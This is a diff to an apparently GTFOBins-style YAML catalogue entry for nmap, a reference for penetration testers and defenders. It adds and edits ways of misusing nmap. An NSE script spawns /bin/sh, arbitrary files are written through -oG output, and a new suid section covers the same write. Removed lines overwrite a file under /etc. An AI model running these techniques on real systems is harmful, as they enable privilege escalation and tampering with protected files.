@@ -87,6 +87,10 @@ functions:
         TF=$(mktemp)
         echo 'lua -e 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
         nmap --script=$TF
+    - description: The payload appears inside the regular nmap output.
+      code: |
+        LFILE=file_to_write
+        nmap -oG=$LFILE DATA
   file-read:
     - code: |
         TF=$(mktemp)
@@ -108,9 +112,9 @@ functions:
         TF=$(mktemp)
         echo 'os.execute("/bin/sh")' > $TF
         ./nmap --script=$TF
-    - description: This will over-write files with nmap output, use with caution.
+  suid:
+    - description: The payload appears inside the regular nmap output.
       code: |
-        sudo touch /etc/filecantbetouched
-        nmap 127.0.0.1 -oN=/etc/filecantbetouched
-        cat /etc/filecantbetouched
+        LFILE=file_to_write
+        ./nmap -oG=$LFILE DATA
 ---
